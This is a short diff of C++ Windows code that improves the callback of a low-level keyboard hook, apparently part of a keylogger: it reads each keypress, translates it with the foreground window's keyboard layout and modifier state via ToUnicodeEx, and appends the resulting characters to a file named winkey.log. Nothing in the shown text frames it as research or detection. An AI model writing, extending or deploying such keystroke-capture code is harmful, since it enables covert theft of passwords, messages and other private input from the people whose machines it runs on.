@@ -8,16 +8,25 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	KBDLLHOOKSTRUCT* kbd_struct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 	HANDLE hFile;
-	DWORD dwPtr;
+	DWORD dwPtr, dwPID, dwThreadID;
 
 	switch (wParam) {
 	case WM_KEYDOWN:
-		UINT c = MapVirtualKey(kbd_struct->vkCode, MAPVK_VK_TO_CHAR);
-		if (c == 0)
+		HWND hForegoundProcess = GetForegroundWindow();
+		dwThreadID = GetWindowThreadProcessId(hForegoundProcess, &dwPID);
+		HKL currentLocale = GetKeyboardLayout(dwThreadID);
+		WCHAR buffer[32];
+
+		BYTE uKeyboardState[256] = { 0 };
+		GetKeyState(VK_SHIFT);
+		GetKeyState(VK_MENU);
+		GetKeyboardState(uKeyboardState);
+		int numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 32, 0, currentLocale);
+		if (numChars < 1)
 			break;
 		hFile = CreateFile(
 			TEXT("winkey.log"),
-			GENERIC_WRITE,
+			FILE_APPEND_DATA,
 			FILE_SHARE_READ,
 			NULL,
 			OPEN_ALWAYS,
@@ -28,8 +37,8 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 
 			WriteFile(
 				hFile,
-				&c,
-				1,
+				buffer,
+				(DWORD)numChars,
 				&dwPtr,
 				NULL);
 
